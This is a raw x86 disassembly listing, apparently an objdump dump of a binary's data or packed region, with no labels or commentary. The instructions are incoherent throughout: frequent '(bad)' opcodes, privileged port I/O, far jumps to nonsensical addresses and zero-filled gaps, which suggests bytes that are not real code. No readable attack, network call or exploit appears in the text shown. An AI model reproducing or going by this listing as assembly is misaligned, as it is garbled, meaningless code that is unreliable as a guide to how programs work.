  41abd3:	xchg   edi,ebp
  41abd5:	(bad)  
  41abd6:	fstp   DWORD PTR [edx]
  41abd8:	out    dx,eax
  41abd9:	dec    edi
  41abda:	pop    es
  41abdb:	cmp    al,0x66
  41abdd:	dec    BYTE PTR [ecx]
  41abdf:	xchg   esi,eax
  41abe0:	scas   eax,DWORD PTR es:[edi]
  41abe1:	pop    ss
  41abe2:	not    eax
  41abe4:	fsub   QWORD PTR [ebx-0x6cc2e140]
  41abea:	or     ecx,DWORD PTR [edi+eax*4+0xb]
  41abee:	sub    cl,0xe9
  41abf1:	and    ebx,DWORD PTR [eax]
  41abf3:	les    ecx,FWORD PTR [ebp+0x6790ff0a]
  41abf9:	xchg   edi,eax
  41abfa:	(bad)  
  41abfb:	(bad)  [ebx+0x920dff6]
  41ac01:	shl    dh,cl
  41ac03:	imul   esi,DWORD PTR [ebp+0x14a09651],0x1b43a4e5
  41ac0d:	repnz sbb ecx,DWORD PTR [esi-0x35]
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edi+ebp*2+0x73]
  41ac82:	add    bl,bh
  41ac84:	dec    ecx
  41ac85:	sbb    al,0x1
  41ac87:	add    BYTE PTR ds:0x4c000001,al
  41ac8d:	sbb    al,0xc9
  41ac8f:	call   ecx
  41ac91:	fs pushf 
  41ac93:	fstp   QWORD PTR [esi-0x3a]
  41ac96:	mov    dl,BYTE PTR ss:[esi+0x7353f609]
  41ac9d:	mov    WORD PTR [eax],gs
  41ac9f:	jns    0x41ac76
  41aca1:	push   edx
  41aca2:	(bad)
  41aca6:	ins    BYTE PTR es:[edi],dx
  41aca7:	or     BYTE PTR [ebx+edx*4],dh
  41acaa:	inc    ebx
  41acab:	sbb    DWORD PTR [ecx+0x14],esp
  41acae:	sbb    ch,BYTE PTR [eax+0x5543d77a]
  41acb4:	lds    edi,FWORD PTR [edx]
  41acb6:	fisub  DWORD PTR [ecx]
  41acb8:	repz retf 
  41acba:	fadd   st(4),st
  41acbc:	inc    ecx
  41acbd:	je     0x41aca0
  41acbf:	loope  0x41ac84
  41acc1:	mov    edi,0x303103e3
  41acc6:	scas   eax,DWORD PTR es:[edi]
  41acc7:	push   es
  41acc8:	out    0xa5,eax
  41acca:	test   DWORD PTR ds:[esp+esi*2-0x4c],esi
  41accf:	addr16 sub al,0x25
  41acd2:	sub    cl,cl
  41acd4:	pop    edx
  41acd5:	sbb    eax,0x37094864
  41acda:	popf   
  41acdb:	into   
  41acdc:	rcl    DWORD PTR [ecx-0x5f],1
  41acdf:	test   ecx,eax
  41ace1:	or     DWORD PTR [eax],edx
  41ace3:	push   edi
  41ace4:	rcr    esp,0xa1
  41ace7:	std    
  41ace8:	adc    dh,BYTE PTR [eax-0x65b5b961]
  41acee:	push   esp
  41acef:	retf   
  41acf0:	mov    bl,0xad
  41acf2:	cmp    al,0x94
  41acf4:	add    BYTE PTR [eax+0x78],dl
  41acf7:	push   ebx
  41acf8:	pushf  
  41acf9:	in     eax,0x1e
  41acfb:	aas    
  41acfc:	push   0xfeca6ba
  41ad01:	cli    
  41ad02:	sub    al,0x2d
  41ad04:	pop    esp
  41ad05:	lahf   
  41ad06:	add    ah,BYTE PTR [edx-0x77]
  41ad09:	call   FWORD PTR [esi]
  41ad0b:	sbb    BYTE PTR [ebx+0x53],al
  41ad0e:	shr    DWORD PTR [ecx-0x7c],1
  41ad11:	in     al,dx
  41ad12:	in     eax,0x1f
  41ad14:	outs   dx,DWORD PTR ds:[esi]
  41ad15:	or     ecx,ecx
  41ad17:	(bad)  [edx]
  41ad19:	xchg   esi,eax
  41ad1a:	aaa    
  41ad1b:	jmp    0xc624e388
  41ad20:	jmp    0xd093d2d7
  41ad25:	aad    0xab
  41ad27:	out    0x1e,eax
  41ad29:	scas   eax,DWORD PTR es:[edi]
  41ad2a:	and    DWORD PTR [esi-0x4b973158],edx
  41ad30:	popf   
  41ad31:	or     ah,BYTE PTR [ecx]
  41ad33:	popa   
  41ad34:	lods   eax,DWORD PTR ds:[esi]
  41ad35:	xchg   ecx,eax
  41ad36:	dec    esi
  41ad37:	inc    edi
  41ad38:	ficomp WORD PTR [ebx+eiz*4-0x4a6fa95b]
  41ad3f:	bound  edx,QWORD PTR [eax]
  41ad41:	sar    BYTE PTR [ecx-0x5a],0xcb
  41ad45:	fcom   DWORD PTR [eax+0x11]
  41ad48:	arpl   WORD PTR [edx+0x41],bx
  41ad4b:	cmp    bh,dh
  41ad4d:	sahf   
  41ad4e:	mov    al,0x2
  41ad50:	je     0x41ad5f
  41ad52:	popa   
  41ad53:	jmp    0x41ace4
  41ad55:	bound  ebp,QWORD PTR [edi+edx*2-0x29e4b25]
  41ad5c:	add    ecx,DWORD PTR [ebx-0x62]
  41ad5f:	and    al,0xe8
  41ad61:	dec    edi
  41ad62:	jg     0x41ace6
  41ad64:	pop    ds
  41ad65:	push   eax
  41ad66:	stos   BYTE PTR es:[edi],al
  41ad67:	push   ss
  41ad68:	outs   dx,DWORD PTR ds:[esi]
  41ad69:	pop    esp
  41ad6a:	inc    ebp
  41ad6b:	pop    ds
  41ad6c:	xchg   ecx,eax
  41ad6d:	popf   
  41ad6e:	cmc    
  41ad6f:	(bad)  [ebx+0x2b]
  41ad72:	cmp    ch,bl
  41ad74:	pop    esi
  41ad75:	pop    ecx
  41ad76:	pop    edi
  41ad77:	stos   DWORD PTR es:[edi],eax
  41ad78:	cmp    ebx,esi
  41ad7a:	xchg   ecx,eax
  41ad7b:	rol    BYTE PTR [ebx+0x2c],cl
  41ad7e:	int    0xd1
  41ad80:	in     eax,dx
  41ad81:	mov    ds:0x2d08357f,eax
  41ad86:	mov    ebp,eax
  41ad88:	sub    BYTE PTR [ecx-0x7a977e21],0x8e
  41ad8f:	mov    ds:0x36,eax
	...
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edx+eiz*8+0x4e60a8d3],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	sub    bl,bh
  41ae0e:	mov    ss,esi
  41ae10:	jns    0x41ae06
  41ae12:	test   al,0xbb
  41ae14:	js     0x41ad9a
  41ae16:	adc    eax,ebx
  41ae18:	xchg   esi,eax
  41ae19:	test   bh,dl
  41ae1b:	nop
  41ae1c:	sar    DWORD PTR [ecx-0x16],cl
  41ae1f:	fimul  WORD PTR [edi+0x42]
  41ae22:	or     dh,0xc0
  41ae25:	add    al,0xe3
  41ae27:	(bad)  
  41ae29:	push   ds
  41ae2a:	and    al,0x82
  41ae2c:	jo     0x41ae8f
  41ae2e:	mov    bh,0x74
  41ae30:	fdivr  DWORD PTR [eax+0x6491abd]
  41ae36:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41ae38:	xchg   ebp,eax
  41ae39:	jmp    0x28df4d73
  41ae3e:	and    eax,DWORD PTR ds:0xc09369e4
  41ae44:	xchg   edx,eax
  41ae45:	cld    
  41ae46:	fisttp DWORD PTR [esi]
  41ae48:	icebp  
  41ae49:	mov    esp,0xe3b04ecc
  41ae4e:	inc    edi
  41ae4f:	adc    dl,BYTE PTR [edi]
  41ae51:	repnz xor bh,bh
  41ae54:	ins    DWORD PTR es:[edi],dx
  41ae55:	push   0xf3c16f6d
  41ae5a:	or     eax,DWORD PTR [ecx+eiz*2+0x755a4d5a]
  41ae61:	xor    edi,DWORD PTR [ecx+0x6d]
  41ae64:	push   cs
  41ae65:	add    bh,BYTE PTR [esi+ebx*1+0x45]
  41ae69:	gs or  bh,al
  41ae6c:	js     0x41ae96
  41ae6e:	mov    dh,0xd7
  41ae70:	fdivr  QWORD PTR [edx-0x3a6b7487]
  41ae76:	mov    BYTE PTR [edx],0x24
  41ae79:	push   esi
  41ae7a:	xchg   esi,eax
  41ae7b:	or     ebx,DWORD PTR [ebp+ebp*4-0x1e]
  41ae7f:	ror    BYTE PTR [eax+0x721a7a16],cl
  41ae85:	pop    edi
  41ae86:	xlat   BYTE PTR ds:[ebx]
  41ae87:	ss add eax,0xafb02d2
  41ae8d:	icebp  
  41ae8e:	mov    BYTE PTR ds:0x1dfcc72f,cl
  41ae94:	jmp    0x1486:0x34e8666e
  41ae9b:	idiv   BYTE PTR [ebx+0x2f]
  41ae9e:	fucompp 
  41aea0:	jno    0x41af0d
  41aea2:	(bad)  
  41aea3:	scas   eax,DWORD PTR es:[edi]
  41aea4:	es retf 
  41aea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aea7:	dec    esi
  41aea8:	jg     0x41ae76
  41aeaa:	adc    DWORD PTR [eax],ebx
  41aeac:	test   DWORD PTR [ebx-0x2ee7974c],ebx
  41aeb2:	not    DWORD PTR [ecx-0x661c2dc1]
  41aeb8:	cmp    BYTE PTR [edx+edx*8],ah
  41aebb:	mov    WORD PTR [ecx],fs
  41aebd:	ret    
  41aebe:	xor    ch,al
  41aec0:	das    
  41aec1:	and    cl,BYTE PTR [ecx+0x73]
  41aec4:	aad    0xbd
  41aec6:	out    0x3a,al
  41aec8:	bound  edx,QWORD PTR [edx+edx*4]
  41aecb:	xor    dl,BYTE PTR [ebx+0x6c]
  41aece:	rcr    ebp,1
  41aed0:	fcmovb st,st(0)
  41aed2:	jne    0x41af37
  41aed4:	frstor [eax-0x62]
  41aed7:	adc    al,0x36
  41aed9:	dec    ebx
  41aeda:	idiv   DWORD PTR [edi+0x19]
  41aedd:	call   DWORD PTR [eax+edi*2+0x2ad33e85]
  41aee4:	popf   
  41aee5:	out    dx,al
  41aee6:	rcr    bh,0xf6
  41aee9:	nop
  41aeea:	jb     0x41aed9
  41aeec:	push   cs
  41aeed:	jmp    0x41af34
  41aeef:	rcr    bh,cl
  41aef1:	shl    BYTE PTR [edx-0x268d71f3],cl
  41aef7:	loop   0x41aeb5
  41aef9:	push   edx
  41aefa:	adc    edi,DWORD PTR [ebp-0x15]
  41aefd:	xor    eax,0xd34bd5c2
  41af02:	xor    BYTE PTR [ecx-0x3e],0x44
  41af06:	or     ebx,DWORD PTR [ecx+0x3]
  41af09:	outs   dx,DWORD PTR ds:[esi]
  41af0a:	aaa    
  41af0b:	mov    DWORD PTR [esi+0x4b],ebx
  41af0e:	cmp    dl,bh
  41af10:	repnz add BYTE PTR [eax],al
	...
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xc61844ee
  41af82:	sbb    ecx,DWORD PTR [ebx+edx*2+0x1e]
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x56000001
  41af8d:	push   edi
  41af8e:	adc    ecx,DWORD PTR [ebx-0x76]
  41af91:	inc    eax
  41af92:	sar    DWORD PTR [edi+0x69654a71],cl
  41af98:	dec    edx
  41af99:	pop    esi
  41af9a:	clc    
  41af9b:	lahf   
  41af9c:	push   eax
  41af9d:	jle    0x41af63
  41af9f:	inc    ebp
  41afa0:	pusha  
  41afa1:	test   al,0x49
  41afa3:	mov    al,ds:0xdf21c747
  41afa8:	sub    dl,BYTE PTR [edi-0x2651da38]
  41afae:	outs   dx,DWORD PTR ds:[esi]
  41afaf:	js     0x41afd5
  41afb1:	(bad)  
  41afb2:	ss mov edi,0xc135722f
  41afb8:	bound  edx,QWORD PTR [edx-0x1fb5c14e]
  41afbe:	outs   dx,DWORD PTR ds:[esi]
  41afbf:	push   ebx
  41afc0:	xchg   ebx,eax
  41afc1:	mov    esp,0xb11e4194
  41afc6:	xchg   ebp,eax
  41afc7:	xlat   BYTE PTR ds:[ebx]
  41afc8:	js     0x41af5c
  41afca:	dec    esp
  41afcb:	xchg   ebx,eax
  41afcc:	sti    
  41afcd:	test   DWORD PTR [eax-0x4fe3583],ebx
  41afd3:	pop    edx
  41afd4:	xor    eax,DWORD PTR [ecx-0x1d]
  41afd7:	xor    edi,DWORD PTR [eax-0x75]
  41afda:	arpl   WORD PTR [edi],bp
  41afdc:	fisub  DWORD PTR [edi]
  41afde:	fld    TBYTE PTR [eax+ecx*4]
  41afe1:	or     dl,BYTE PTR [edi+0x42de2015]
  41afe7:	std    
  41afe8:	aaa    
  41afe9:	cmc    
  41afea:	inc    esi
  41afeb:	(bad)  
  41afec:	and    BYTE PTR [edi-0x5a244fe3],ah
  41aff2:	outs   dx,BYTE PTR ds:[esi]
  41aff3:	or     edi,DWORD PTR [edx]
  41aff5:	inc    ecx
  41aff6:	pushf  
  41aff7:	cmp    BYTE PTR [eax],cl
  41aff9:	mov    ebx,0x48546ce
  41affe:	es aaa 
  41b000:	jp     0x41aff5
  41b002:	sub    esp,edi
  41b004:	mov    esp,0x8b8a2039
  41b009:	pop    eax
  41b00a:	push   edx
  41b00b:	js     0x41b03c
  41b00d:	hlt    
  41b00e:	sub    ebx,0xe001a080
  41b014:	cmp    dh,BYTE PTR [esi-0x14]
  41b017:	or     dl,dl
  41b019:	in     al,0x1c
  41b01b:	lock mov ecx,ss
  41b01e:	adc    bl,dl
  41b020:	stos   BYTE PTR es:[edi],al
  41b021:	addr16 mov ecx,0xff6d879e
  41b027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b028:	lods   al,BYTE PTR ds:[esi]
  41b029:	in     al,0x48
  41b02b:	das    
  41b02c:	pop    eax
  41b02d:	sahf   
  41b02e:	and    eax,0xbfefbcf6
  41b033:	pop    ebx
  41b034:	es fcmovnbe st,st(0)
  41b037:	mov    dl,0x94
  41b039:	inc    ebp
  41b03a:	pop    ebp
  41b03b:	push   ss
  41b03c:	out    0xdb,eax
  41b03e:	mov    edi,0x75cf9343
  41b043:	(bad)  
  41b044:	or     BYTE PTR [eax],0xa3
  41b047:	or     BYTE PTR [ecx+0x138b8e85],0x9e
  41b04e:	mov    esp,0x8ada7414
  41b053:	and    ah,bl
  41b055:	call   0xf50fa8c6
  41b05a:	sbb    al,0xe
  41b05c:	das    
  41b05d:	sbb    DWORD PTR [ebx],0x52c73275
  41b063:	unpckhps xmm3,XMMWORD PTR [ecx]
  41b066:	cld    
  41b067:	mov    esp,0xafb030e4
  41b06c:	aas    
  41b06d:	jl     0x41affa
  41b06f:	hlt    
  41b070:	les    eax,FWORD PTR [ebx-0x7a]
  41b073:	into   
  41b074:	jnp    0x41b0a7
  41b076:	cld    
  41b077:	mov    edx,0x8a1c3ee9
  41b07c:	pop    ecx
  41b07d:	jae    0x41b02e
  41b07f:	add    al,0x38
  41b081:	fst    QWORD PTR [esi-0x2d]
  41b084:	aaa    
  41b085:	push   es
  41b086:	test   eax,0x1b2b4d3b
  41b08b:	or     bl,BYTE PTR [edx-0x7160e72e]
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x323ef6da
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x3f000001
  41b10d:	jb     0x41b0be
  41b10f:	sahf   
  41b110:	mov    dh,BYTE PTR [ecx+0x4180222f]
  41b116:	push   cs
  41b117:	jecxz  0x41b11c
  41b119:	add    ch,BYTE PTR [edi+0x6e5863a2]
  41b11f:	xor    eax,DWORD PTR [edi-0x5e]
  41b122:	in     eax,0xa
  41b124:	jmp    0x41b193
  41b126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b127:	frstor [edi]
  41b129:	push   es
  41b12a:	xchg   esi,eax
  41b12b:	mov    ecx,0x346834da
  41b130:	leave  
  41b131:	outs   dx,BYTE PTR ds:[esi]
  41b132:	gs mov bh,0xe8
  41b135:	out    0x4f,al
  41b137:	pop    ebx
  41b138:	jge    0x41b0f8
  41b13a:	sub    eax,0xc474eb7e
  41b13f:	sbb    ah,BYTE PTR [ebx-0xf]
  41b142:	jb     0x41b11f
  41b144:	cli    
  41b145:	mov    ss,WORD PTR [esi+0x5ad1b112]
  41b14b:	and    al,0x2e
  41b14d:	xchg   edi,eax
  41b14e:	js     0x41b100
  41b150:	push   ecx
  41b151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b152:	jecxz  0x41b159
  41b154:	aam    0xec
  41b156:	pop    esi
  41b157:	shr    DWORD PTR [eax],cl
  41b159:	(bad)  [esi-0x4844f8a3]
  41b15f:	mov    esi,DWORD PTR [ebx]
  41b161:	out    0xae,al
  41b163:	not    edx
  41b165:	push   ds
  41b166:	les    eax,FWORD PTR [edx-0x40863a4c]
  41b16c:	xor    DWORD PTR [edi],edi
  41b16e:	xchg   edx,eax
  41b16f:	out    0xf6,al
  41b171:	sbb    eax,0x402a1d28
  41b176:	adc    cl,BYTE PTR [eax-0x1e6cfbea]
  41b17c:	dec    esp
  41b17d:	inc    esp
  41b17e:	dec    ebp
  41b17f:	xor    ebp,DWORD PTR [ecx-0x15497383]
  41b185:	arpl   WORD PTR [ebp-0x35b4ea84],sp
  41b18b:	mov    DWORD PTR [ecx-0x73fa0031],esi
  41b191:	imul   eax,DWORD PTR [ebx],0x3307618f
  41b197:	pop    DWORD PTR [ebp+0x6f]
  41b19a:	xor    dh,dl
  41b19c:	push   edi
  41b19d:	leavew 
  41b19f:	(bad)  
  41b1a0:	mov    eax,ds:0xc412187d
  41b1a5:	test   DWORD PTR [ebx-0x74d5e6b1],ecx
  41b1ab:	scas   al,BYTE PTR es:[edi]
  41b1ac:	sub    BYTE PTR [ebx-0x7b],al
  41b1af:	dec    esp
  41b1b0:	out    0x21,eax
  41b1b2:	add    al,0x55
  41b1b4:	push   edi
  41b1b5:	shr    BYTE PTR [eax+ebp*8-0x62],0x51
  41b1ba:	dec    ecx
  41b1bb:	(bad)  
  41b1bd:	cwde   
  41b1be:	or     edi,DWORD PTR [esi]
  41b1c0:	cmp    ebx,eax
  41b1c2:	mov    BYTE PTR [esi-0x1c],0x5c
  41b1c6:	sti    
  41b1c7:	inc    ebx
  41b1c8:	mov    esp,0x8520958b
  41b1cd:	inc    bh
  41b1cf:	dec    ecx
  41b1d0:	cmp    DWORD PTR [edi],ebx
  41b1d2:	jg     0x41b1d8
  41b1d4:	int    0x24
  41b1d6:	aaa    
  41b1d7:	outs   dx,BYTE PTR ds:[esi]
  41b1d8:	fcmovbe st,st(2)
  41b1da:	pop    ss
  41b1db:	int3   
  41b1dc:	sub    al,0xf2
  41b1de:	sbb    ch,bh
  41b1e0:	dec    edi
  41b1e1:	add    BYTE PTR [esi-0x704a18fc],bh
  41b1e7:	rcl    ch,1
  41b1e9:	jne    0x41b187
  41b1eb:	sbb    dl,ah
  41b1ed:	inc    eax
  41b1ee:	fwait
  41b1ef:	xor    al,0x9c
  41b1f1:	mov    es,WORD PTR [eax-0x2e]
  41b1f4:	int    0xae
  41b1f6:	mov    dl,bl
  41b1f8:	idiv   edi
  41b1fa:	xchg   DWORD PTR [ecx],esi
  41b1fc:	sahf   
  41b1fd:	xchg   ecx,ecx
  41b1ff:	leave  
  41b200:	std    
  41b201:	pushf  
  41b202:	or     ebp,DWORD PTR [ecx+ebx*8]
  41b205:	es dec esp
  41b207:	sbb    eax,0x5ee4e842
  41b20c:	dec    esi
  41b20d:	ds push edx
  41b20f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b210:	fadd   DWORD PTR [eax]
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR ds:0x5d0cba50,bl
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0xe000001,al
  41b28d:	pop    ss
  41b28e:	retf   0x7dfd
  41b291:	mov    al,0xe
  41b293:	sbb    eax,0x9600e3d2
  41b298:	mov    bl,0x35
  41b29a:	push   esp
  41b29b:	test   BYTE PTR [esi+0x4a48392b],dh
  41b2a1:	cs jns 0x41b253
  41b2a4:	jns    0x41b2ff
  41b2a6:	inc    esi
  41b2a7:	mov    edi,0x75c53fc
  41b2ac:	mov    al,0x91
  41b2ae:	call   0x47be:0xdbf73f1e
  41b2b5:	add    DWORD PTR [ebp-0x20],0x9c58207c
  41b2bc:	cmp    BYTE PTR [ecx],bl
  41b2be:	jp     0x41b2fe
  41b2c0:	pop    ecx
  41b2c1:	sbb    ah,dh
  41b2c3:	loope  0x41b275
  41b2c5:	jns    0x41b2ca
  41b2c7:	cwde   
  41b2c8:	lock sti 
  41b2ca:	fmul   DWORD PTR [esi+ecx*4]
  41b2cd:	lahf   
  41b2ce:	popf   
  41b2cf:	jmp    0x355409c1
  41b2d4:	ret    
  41b2d5:	mov    ebx,0x99fe56f6
  41b2da:	pop    edx
  41b2db:	scas   al,BYTE PTR es:[edi]
  41b2dc:	mov    ecx,DWORD PTR [ebx]
  41b2de:	pop    ebp
  41b2df:	inc    ecx
  41b2e0:	mov    al,ds:0x97e3828d
  41b2e5:	adc    dl,0x20
  41b2e8:	psubw  mm4,mm3
  41b2eb:	jns    0x41b346
  41b2ed:	repz jp 0x41b2a5
  41b2f0:	mov    ebx,0x2621dfbf
  41b2f5:	retf   0x3e56
  41b2f8:	adc    DWORD PTR [esi+0x4615b6f9],esi
  41b2fe:	or     DWORD PTR [edx+edx*8+0x53],esi
  41b302:	sbb    al,0x8c
  41b304:	loope  0x41b2b7
  41b306:	pop    esp
  41b307:	mov    ebp,0xe4123
  41b30c:	sbb    BYTE PTR [edx-0x7a],0x4a
  41b310:	lds    eax,FWORD PTR [ebx]
  41b312:	mov    DWORD PTR [ebx+0x1755fc25],ebp
  41b318:	lds    eax,FWORD PTR [esi+0x5953b406]
  41b31e:	ror    BYTE PTR [edi+0x1a],0x92
  41b322:	push   eax
  41b323:	mov    edi,0x18a86e2e
  41b328:	push   eax
  41b329:	dec    edi
  41b32a:	or     edi,DWORD PTR [ebx-0x44]
  41b32d:	test   eax,0x1ad9b6b8
  41b332:	outs   dx,BYTE PTR ds:[esi]
  41b333:	push   ds
  41b334:	lds    ebx,FWORD PTR [ebp-0x424b86bf]
  41b33a:	mov    ebp,0xdb94805b
  41b33f:	stc    
  41b340:	idiv   DWORD PTR [esi+0x3b20e0c1]
  41b346:	rcl    edx,0x68
  41b349:	sar    BYTE PTR [ebp+0x3fff0172],0xb6
  41b350:	add    eax,0x2673ecce
  41b355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b356:	or     eax,0xbc781ded
  41b35b:	mov    esi,0xdea1ff79
  41b361:	idiv   ah
  41b363:	mov    eax,ds:0x81bf8dfe
  41b368:	jmp    0xf48deca6
  41b36d:	daa    
  41b36e:	add    BYTE PTR [edx],dh
  41b370:	rol    bl,cl
  41b372:	xchg   edx,eax
  41b373:	std    
  41b374:	scas   eax,DWORD PTR es:[edi]
  41b375:	jbe    0x41b353
  41b377:	xor    DWORD PTR [ebx-0x55e0bbb2],0xffffffe0
  41b37e:	int    0x69
  41b380:	and    ebp,DWORD PTR [esi+0x5cf6e36]
  41b386:	mov    esi,0x159e0f0
  41b38b:	pop    eax
  41b38c:	cmc    
  41b38d:	add    BYTE PTR [edi+0xf848],dh
	...
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	adc    DWORD PTR [esi+0x2162978a],ecx
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0xd2000001
  41b40d:	mov    cl,0x5b
  41b40f:	out    0xda,eax
  41b411:	(bad)  
  41b412:	lock and eax,0xdabc0173
  41b418:	test   BYTE PTR [eax-0x24bb189b],ah
  41b41e:	jno    0x41b40d
  41b420:	pop    edx
  41b421:	dec    esp
  41b422:	or     eax,0x922d616e
  41b427:	cdq    
  41b428:	push   edx
  41b429:	or     dh,dh
  41b42b:	and    DWORD PTR [edi+0x2c6aea99],ebx
  41b431:	push   edx
  41b432:	or     ecx,DWORD PTR [esi-0x28]
  41b435:	inc    eax
  41b436:	cmp    DWORD PTR [esi-0x60530696],ecx
  41b43c:	lds    ebp,FWORD PTR [ebx+0x5c]
  41b43f:	jb     0x41b449
  41b441:	jecxz  0x41b466
  41b443:	mov    edx,0xa42c75f8
  41b448:	test   BYTE PTR [eax],0xed
  41b44b:	adc    eax,0x7ed7b9c
  41b450:	mov    DWORD PTR [edi+edx*2+0x5a7d09a2],ecx
  41b457:	add    bl,BYTE PTR [ebx+0x55bdb97]
  41b45d:	mov    dl,0xf7
  41b45f:	sbb    BYTE PTR [ebp+0x39b9d23d],bh
  41b465:	jae    0x41b428
  41b467:	pusha  
  41b468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b469:	clc    
  41b46a:	mov    edx,0x6ba44cd6
  41b46f:	jmp    0x9d20f247
  41b474:	aaa    
  41b475:	jmp    0x160:0x545976b
  41b47c:	pop    ecx
  41b47d:	push   0xb23b8c0c
  41b482:	push   edx
  41b483:	cmp    esi,edx
  41b485:	push   0xffffff82
  41b487:	xor    edi,DWORD PTR [edi]
  41b489:	ret    0xa929
  41b48c:	rcr    BYTE PTR [edi],cl
  41b48e:	fisttp QWORD PTR [edx-0x264d9cef]
  41b494:	push   ds
  41b495:	in     al,dx
  41b496:	dec    ecx
  41b497:	sub    eax,0x808f2a71
  41b49c:	fst    DWORD PTR [eax+0x66]
  41b49f:	sbb    DWORD PTR [ebx],ebp
  41b4a1:	ins    BYTE PTR es:[edi],dx
  41b4a2:	pusha  
  41b4a3:	xlat   BYTE PTR ds:[ebx]
  41b4a4:	inc    esi
  41b4a5:	fild   QWORD PTR [ebx+0x78]
  41b4a8:	dec    ebp
  41b4a9:	mov    esi,DWORD PTR [ebp+0x37]
  41b4ac:	lods   al,BYTE PTR ds:[esi]
  41b4ad:	das    
  41b4ae:	lods   al,BYTE PTR ds:[esi]
  41b4af:	outs   dx,DWORD PTR ds:[esi]
  41b4b0:	gs (bad) 
  41b4b2:	pop    ds
  41b4b3:	jnp    0x41b467
  41b4b5:	or     ah,BYTE PTR [ebp+0x5e]
  41b4b8:	cdq    
  41b4b9:	es push ebx
  41b4bb:	ss popa 
  41b4bd:	mov    bh,cl
  41b4bf:	xor    bl,BYTE PTR [ebx]
  41b4c1:	mov    edi,0xc895f017
  41b4c6:	test   eax,0xa31b211f
  41b4cb:	scas   eax,DWORD PTR es:[edi]
  41b4cc:	into   
  41b4cd:	popf   
  41b4ce:	fisttp QWORD PTR [ebp-0x3d]
  41b4d1:	(bad)
  41b4d5:	cmp    eax,0x4482c427
  41b4da:	shl    edx,1
  41b4dc:	sbb    al,0x38
  41b4de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4df:	jecxz  0x41b548
  41b4e1:	xchg   esp,ebp
  41b4e3:	imul   edi,DWORD PTR [ecx+0x93a464a],0xd6e153f5
  41b4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ee:	jecxz  0x41b4bc
  41b4f0:	pop    ebx
  41b4f1:	mov    bh,al
  41b4f3:	dec    edi
  41b4f4:	adc    eax,0x907919b5
  41b4f9:	mov    dh,0xa4
  41b4fb:	ror    eax,0x66
  41b4fe:	retf   0x342d
  41b501:	xchg   BYTE PTR [edx],dl
  41b503:	mov    esp,0x661303c3
  41b508:	push   eax
  41b50a:	test   BYTE PTR [ebx-0x7141190e],dh
  41b510:	in     eax,0x0
	...
  41b572:	add    BYTE PTR [eax],al
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	push   esi
  41b581:	cdq    
  41b582:	push   0xffffff96
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0xed000001,al
  41b58d:	mov    dh,0x2e
  41b58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b590:	pusha  
  41b591:	fst    DWORD PTR [eax+0x5053f225]
  41b597:	pop    ebx
  41b598:	mov    BYTE PTR [edx-0x19be724f],cl
  41b59e:	mov    ebp,0x9d29ffaf
  41b5a3:	nop
  41b5a4:	into   
  41b5a5:	xchg   esi,eax
  41b5a6:	in     eax,0xa4
  41b5a8:	cs fdiv st(3),st
  41b5ab:	and    al,0xf7
  41b5ad:	dec    ebx
  41b5ae:	sub    BYTE PTR [eax],ch
  41b5b0:	ins    BYTE PTR es:[edi],dx
  41b5b1:	iret   
  41b5b2:	mov    dl,0x74
  41b5b4:	xchg   esi,eax
  41b5b5:	cmp    BYTE PTR fs:[ebx+0x4e0b0d2c],0xdf
  41b5bd:	jae    0x41b60e
  41b5bf:	pop    esp
  41b5c0:	fist   DWORD PTR [ebx]
  41b5c2:	aam    0xb5
  41b5c4:	hlt    
  41b5c5:	xchg   ebx,eax
  41b5c6:	test   al,0xaa
  41b5c8:	push   ebp
  41b5c9:	jae    0x41b612
  41b5cb:	lea    edx,[eax+0x7b]
  41b5ce:	and    BYTE PTR [ebx-0x1c],ch
  41b5d1:	or     eax,0x7e5b2fa4
